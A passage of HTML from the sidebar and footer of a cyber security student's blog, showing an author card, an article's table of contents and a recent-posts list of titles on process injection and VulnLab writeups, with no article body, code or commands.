class="is-center"><div class="avatar-img"><img src="/img/CyberKMZ.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mohamed Khalil Mzali</div><div class="author-info__description">Cyber Security Student</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/CyberKMZ"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/CyberKMZ" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:cyber.mzali@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/khalil-mzali/" target="_blank" title=""><i class="fab fa-linkedin-in"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Welcome to my blog where I post about writeups and articles.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Explanation"><span class="toc-number">2.</span> <span class="toc-text">Explanation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demonstration"><span class="toc-number">3.</span> <span class="toc-text">Demonstration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Full-code"><span class="toc-number">4.</span> <span class="toc-text">Full code</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/31/DLLInjection/" title="DLL Injection"><img src="/img/DLLInjection/img.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DLL Injection"/></a><div class="content"><a class="title" href="/2024/12/31/DLLInjection/" title="DLL Injection">DLL Injection</a><time datetime="2024-12-30T23:00:00.000Z" title="Created 2024-12-31 00:00:00">2024-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/22/RemoteProcessInjection/" title="Remote Process Injection"><img src="/img/RemoteProcessInjection/img.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Remote Process Injection"/></a><div class="content"><a class="title" href="/2024/12/22/RemoteProcessInjection/" title="Remote Process Injection">Remote Process Injection</a><time datetime="2024-12-21T23:00:00.000Z" title="Created 2024-12-22 00:00:00">2024-12-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/28/ReflectionChainWriteup/" title="Reflection AD Chain VulnLab - Writeup"><img src="/img/Reflection/reflection.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Reflection AD Chain VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/11/28/ReflectionChainWriteup/" title="Reflection AD Chain VulnLab - Writeup">Reflection AD Chain VulnLab - Writeup</a><time datetime="2024-11-27T23:00:00.000Z" title="Created 2024-11-28 00:00:00">2024-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/26/TrustedChainWriteup/" title="Trusted AD Chain VulnLab - Writeup"><img src="/img/Trusted/trusted_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Trusted AD Chain VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/11/26/TrustedChainWriteup/" title="Trusted AD Chain VulnLab - Writeup">Trusted AD Chain VulnLab - Writeup</a><time datetime="2024-11-25T23:00:00.000Z" title="Created 2024-11-26 00:00:00">2024-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/15/BabyWriteup-Vulnlab/" title="Baby VulnLab - Writeup"><img src="/img/Baby/baby_vulnlab.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Baby VulnLab - Writeup"/></a><div class="content"><a class="title" href="/2024/08/15/BabyWriteup-Vulnlab/" title="Baby VulnLab - Writeup">Baby VulnLab - Writeup</a><time datetime="2024-08-14T23:00:00.000Z" title="Created 2024-08-15 00:00:00">2024-08-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/DLLInjection/img.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Mohamed Khalil Mzali</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
